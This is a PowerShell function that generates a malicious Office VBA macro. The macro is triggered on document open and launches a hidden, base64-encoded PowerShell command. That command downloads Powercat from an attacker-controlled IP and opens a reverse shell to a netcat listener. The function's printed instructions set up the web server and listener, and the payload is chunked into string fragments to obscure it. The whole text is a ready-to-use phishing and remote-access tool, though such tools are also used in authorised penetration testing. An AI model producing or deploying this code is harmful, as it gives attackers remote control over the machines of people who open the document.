function Get-RevShellMacro
{
    [cmdletbinding()]
    Param
    (
        [String]$IP,
        [int]$Port,
        [String]$PowercatFilePath,
        [String]$CustomPayload
    )

    Write-Host "
1. Start a web server hosting Powercat (location for kali below): 
    cd /usr/share/powershell-empire/empire/server/data/module_source/management/
    python -m http.server 80
2. Start a netcat listener with the port you specified
    nc -nvlp 4444
----------------------------------------------------------------------------------
    " 
    $macroBuilder = [System.Text.StringBuilder]::new()
    $m = @'
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
'@
    $null = $macroBuilder.Append($m)

    if (-not $CustomPayload) {
        $basePayloadString = "IEX(New-Object System.Net.WebClient).DownloadString('http://$IP/$PowercatFilePath');powercat -c $IP -p $Port -e powershell"
        $basePayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($basePayloadString)
        $basePayload = [Convert]::ToBase64String($basePayloadBytes)
    } else {
        Write-Host "A CustomPayload was provided!"
        Write-Host "-----------------------------"
        $basePayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($CustomPayload)
        $basePayload = [Convert]::ToBase64String($basePayloadBytes)
    }

    $fullPayload = "`powershell.exe -nop -w hidden -enc $basePayload"

    $n = 50 
    for ($i = 0; $i -lt $fullPayload.Length; $i += $n) {
        $substring = $fullPayload.Substring($i, [Math]::Min($n, $fullPayload.Length - $i))
        $null = $macroBuilder.Append([Environment]::NewLine)
        $null = $macroBuilder.Append("    Str = Str + `"$substring`"")
    }
    
    $null = $macroBuilder.Append([Environment]::NewLine)
    $null = $macroBuilder.Append('    CreateObject("Wscript.Shell").Run Str')
    $null = $macroBuilder.Append([Environment]::NewLine)
    $null = $macroBuilder.Append("End Sub")
    $macroBuilder.ToString()
}